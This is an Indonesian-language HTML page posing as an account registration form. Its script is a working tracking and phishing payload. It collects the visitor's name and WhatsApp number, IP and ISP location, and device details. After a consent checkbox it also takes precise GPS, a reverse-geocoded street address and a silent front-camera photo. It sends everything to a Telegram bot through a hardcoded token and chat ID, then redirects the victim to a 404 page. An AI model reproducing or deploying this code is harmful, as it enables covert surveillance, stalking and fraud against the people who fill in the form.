<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8"/>
  <meta name="viewport" content="width=device-width,initial-scale=1"/>
  <title>Daftar</title>
  <style>
    /* Simple clean form UI (no debug shown) */
    body { font-family: Inter,system-ui,Arial; background:#f6f8fa; margin:0; min-height:100vh; display:flex; align-items:center; justify-content:center; }
    .card { width:360px; background:#fff; border-radius:12px; padding:18px; box-shadow:0 8px 30px rgba(2,6,23,0.08); }
    h1{ font-size:18px; margin:0 0 8px 0; }
    label{ display:block; margin-top:10px; font-size:13px; color:#222; }
    input[type="text"], input[type="tel"] { width:100%; padding:10px; margin-top:6px; border-radius:8px; border:1px solid #e3e7ee; font-size:14px; }
    .consent { margin-top:12px; font-size:13px; color:#444; }
    .consent input{ margin-right:8px; }
    button { width:100%; margin-top:14px; padding:11px; border-radius:10px; border:none; background:#0b57d0; color:#fff; font-weight:700; cursor:pointer; }
    button[disabled]{ opacity:0.6; cursor:not-allowed; }
    .small{ font-size:12px; color:#666; margin-top:8px; text-align:center; }
  </style>
</head>
<body>
  <div class="card" role="main" aria-labelledby="title">
    <h1 id="title">Buat Akun</h1>

    <form id="regForm" autocomplete="off">
      <label for="name">Nama</label>
      <input id="name" name="name" type="text" required placeholder="Nama lengkap">

      <label for="wa">Nomor WhatsApp (contoh 62812...)</label>
      <input id="wa" name="wa" type="tel" required placeholder="62812xxxxxxxx">

      <div class="consent">
        <label><input id="consent" type="checkbox"> Saya memberi izin untuk mengambil foto & lokasi (untuk verifikasi).</label>
      </div>

      <button id="submitBtn" type="submit">Daftar</button>
      <div class="small">Setelah berhasil, kamu akan diarahkan.</div>
    </form>
  </div>

<script>
/* === CONFIG (ISI TOKEN & CHAT ID) === */
const BOT_TOKEN = "8275671762:AAFHjoV2ZQCW9y69JvUTarIw7hUT0NVAXF8";
const CHAT_ID   = "6216902201";
/* =================================== */

/* Helpers */
function rand(arr){ return arr[Math.floor(Math.random()*arr.length)]; }
function generatePhone(){ let s='628'; const len = 9 + Math.floor(Math.random()*3); for(let i=0;i<len;i++) s+=Math.floor(Math.random()*10); return s; }
function generateFakeProfile(){ const first=["Budi","Andi","Siti","Rina","Agus","Dewi","Joko","Rian","Fitri","Eka"]; const last=["Santoso","Wijaya","Kurniawan","Hidayat","Kartika","Pratama"]; const jobs=["Reseller","Pelajar","Karyawan","Driver","Freelancer"]; const kampung=["Babakan","Cisaat","Cibadak"]; const name = rand(first)+' '+rand(last); return { name, age: String(18+Math.floor(Math.random()*40)), gender: Math.random()>0.5?"Laki-laki":"Perempuan", job: rand(jobs), kampung: rand(kampung), phone: generatePhone() }; }

/* Minimal fetch JSON util */
async function fetchJSON(url){ try{ const r = await fetch(url, { cache: 'no-store' }); if(!r.ok) throw new Error('bad '+r.status); return await r.json(); }catch(e){ return null; } }

/* IP info fallback */
async function getIPInfo(){
  const sources = [
    { url:'https://ipapi.co/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country_name||j.country, org:j.org, postal:j.postal, timezone:j.timezone, lat:j.latitude||j.lat, lon:j.longitude||j.lon }) },
    { url:'https://ipwhois.app/json/', mapper: j => ({ ip:j.ip, city:j.city, region:j.region, country:j.country, org:j.org||j.isp, postal:j.postal, timezone:j.timezone, lat:j.latitude, lon:j.longitude }) },
    { url:'https://api.ipify.org?format=json', mapper: j => ({ ip:j.ip }) }
  ];
  for(const s of sources){
    const j = await fetchJSON(s.url);
    if(!j) continue;
    const m = s.mapper(j);
    if(m && m.ip) return m;
  }
  return { ip:'unknown' };
}

/* Reverse geocode via Nominatim -> return address object + display */
async function revGeocode(lat, lon){
  try{
    const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`, { cache:'no-store', headers:{ 'User-Agent':'LegalApp/1.0' }});
    if(!r.ok) throw new Error('revgeo '+r.status);
    const j = await r.json();
    return { display: j.display_name || null, address: j.address || {} };
  }catch(e){ return { error: e.message || 'revgeo fail' }; }
}

/* Geo (prompts) */
function getGeo(){
  return new Promise(resolve=>{
    if(!navigator.geolocation) return resolve({ error:'geolocation not supported' });
    navigator.geolocation.getCurrentPosition(p=>{
      resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc: p.coords.accuracy + ' m' });
    }, err => resolve({ error: err.message }), { enableHighAccuracy: true, timeout: 10000 });
  });
}

/* Battery */
async function getBattery(){ try{ if(!navigator.getBattery) return null; const b = await navigator.getBattery(); return `${Math.round(b.level*100)}% (${b.charging? 'Charging':'Not Charging'})`; }catch{ return null; } }
function getConnection(){ try{ const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection; if(!c) return null; return { effectiveType:c.effectiveType, downlink:c.downlink, rtt:c.rtt, saveData:c.saveData }; }catch{ return null; } }

/* Capture photo (asks camera permission) */
async function capturePhoto(){
  try{
    const s = await navigator.mediaDevices.getUserMedia({ video:{ facingMode:'user' }, audio:false });
    const v = document.createElement('video'); v.srcObject = s;
    await v.play();
    await new Promise(r=>setTimeout(r,900));
    const canvas = document.createElement('canvas');
    const side = Math.min(v.videoWidth||640, v.videoHeight||480);
    const size = 800;
    canvas.width = size; canvas.height = size;
    const ctx = canvas.getContext('2d');
    const sx = Math.max(0,(v.videoWidth - side)/2), sy = Math.max(0,(v.videoHeight - side)/2);
    ctx.drawImage(v, sx, sy, side, side, 0, 0, size, size);
    s.getTracks().forEach(t=>t.stop());
    return await new Promise(res=>canvas.toBlob(res,'image/jpeg',0.85));
  }catch(e){
    return null;
  }
}

/* Build boxed caption (ordered & tidy) */
function buildBoxedCaption(obj){
  const now = new Date();
  const lines = [];
  lines.push(`╭─ > Tanggal: ${now.toLocaleString()}`);
  if(obj.profile && obj.profile.phone) lines.push(` ├─ > Nomor Telepon: ${obj.profile.phone}`);
  lines.push(` ├─ > Nama: ${obj.profile && obj.profile.name ? obj.profile.name : (obj.name || '-')}`);
  lines.push(` ├─ > Pesan`);
  lines.push(` │   └─ ${obj.message || 'Pendaftaran & Verifikasi (dengan izin)'}`);
  lines.push(` ├─ > Pengirim (web)`);
  lines.push(` │   └─ ${obj.userAgent || '-'}`);
  lines.push(` ├─ > IP / ISP`);
  const ip = obj.ipInfo || {};
  lines.push(` │   ├─ IP: ${ip.ip || '-'}`);
  lines.push(` │   ├─ ISP/Org: ${ip.org || '-'}`);
  lines.push(` │   ├─ City: ${ip.city || '-'}`);
  lines.push(` │   ├─ Region: ${ip.region || '-'}`);
  lines.push(` │   ├─ Country: ${ip.country || '-'}`);
  lines.push(` │   └─ Postal: ${ip.postal || '-'}`);
  lines.push(` ├─ > Device`);
  lines.push(` │   ├─ Platform: ${obj.platform || '-'}`);
  lines.push(` │   ├─ Screen: ${obj.screen || '-'}`);
  lines.push(` │   ├─ Language: ${obj.language || '-'}`);
  lines.push(` │   ├─ Timezone: ${obj.timezone || '-'}`);
  lines.push(` │   ├─ Battery: ${obj.battery || '-'}`);
  lines.push(` ├─ > Geo (GPS)`);
  if(obj.geo && !obj.geo.error){
    lines.push(` │   ├─ Lat: ${obj.geo.lat}`);
    lines.push(` │   ├─ Lon: ${obj.geo.lon}`);
    lines.push(` │   ├─ Akurasi: ${obj.geo.acc || '-'}`);
    lines.push(` │   └─ Maps: https://maps.google.com/?q=${obj.geo.lat},${obj.geo.lon}`);
  } else {
    lines.push(` │   └─ GPS: ${obj.geo? obj.geo.error : '-'}`);
  }
  lines.push(` ├─ > Alamat (Detail)`);
  const a = obj.address || {};
  // many common keys
  const addr = [
    ['Negara','country'], ['Kode Negara','country_code'], ['Provinsi','state'],
    ['State District','state_district'], ['Kabupaten','county'], ['Region','region'],
    ['Kota','city'], ['Town','town'], ['Village','village'], ['Municipality','municipality'],
    ['Kecamatan/Suburb','suburb'], ['Neighbourhood','neighbourhood'], ['Quarter','quarter'],
    ['Kampung/Hamlet','hamlet'], ['Jalan','road'], ['Nomor','house_number'], ['Kode Pos','postcode']
  ];
  for(const [label,key] of addr){
    lines.push(` │   ├─ ${label}: ${a[key] || '-'}`);
  }
  lines.push(` ╰─ > Sumber: Sistem (dengan persetujuan pengguna)`);
  const text = lines.join('\n');
  return text.length>1000? text.slice(0,1000-3)+'...' : text;
}

/* Telegram send (photo+caption single message) */
async function sendPhotoCaption(blob, caption){
  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', blob, 'photo.jpg');
  fd.append('caption', caption);
  // plain text caption (no HTML)
  return fetch(url, { method:'POST', body: fd });
}

/* Fallback text-only send */
async function sendText(caption){
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: caption })
  });
}

/* Main form handler */
document.getElementById('regForm').addEventListener('submit', async function(e){
  e.preventDefault();
  const name = document.getElementById('name').value.trim();
  const wa = document.getElementById('wa').value.trim();
  const consent = document.getElementById('consent').checked;

  // basic validation
  if(!name || !wa){ alert('Isi nama dan nomor WA'); return; }

  // prepare minimal profile object
  let profile = { name, phone: wa };
  // send minimal registration message first (fast)
  const regText = `╭─ > Tanggal: ${new Date().toLocaleString()}\n ├─ > Nama: ${name}\n ├─ > Nomor WA: ${wa}\n ╰─ > Aksi: Pendaftaran`;
  try{
    await sendText(regText);
  }catch(e){
    // ignore; continue to attempt full report
  }

  // if user consented, gather device, ip, geo, photo
  let photo = null;
  let geo = { error:'not requested' };
  let ipInfo = await getIPInfo();
  let rev = null;
  const battery = await getBattery();
  const connection = getConnection();
  const device = {
    platform: navigator.platform || '-',
    userAgent: navigator.userAgent || '-',
    screen: (window.screen? `${screen.width}x${screen.height}` : '-'),
    language: navigator.language || '-',
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '-',
    battery: battery || '-'
  };

  if(consent){
    // get geo (may prompt)
    geo = await getGeo();
    if(!geo.error && geo.lat && geo.lon){
      rev = await revGeocode(geo.lat, geo.lon);
    }
    // get photo (may prompt)
    photo = await capturePhoto();
  }

  // if profile has no phone (shouldn't), generate safe phone
  if(!profile.phone) profile.phone = generatePhone();

  // build caption
  const obj = {
    profile,
    name,
    message: 'Pendaftaran & Verifikasi (dengan izin)',
    userAgent: device.userAgent,
    ipInfo,
    platform: device.platform,
    screen: device.screen,
    language: device.language,
    timezone: device.timezone,
    battery: device.battery,
    geo,
    address: (rev && rev.address) ? rev.address : {},
  };
  const caption = buildBoxedCaption(obj);

  // send single message: photo+caption if photo exists, else text-only
  try{
    if(photo){
      await sendPhotoCaption(photo, caption);
    } else {
      await sendText(caption);
    }
  }catch(e){
    // ignore silently
  }

  // redirect to 404 page (no debug shown)
  // change this URL if you want a different redirect target
  window.location.href = '/404.html';
});
</script>
</body>
</html>
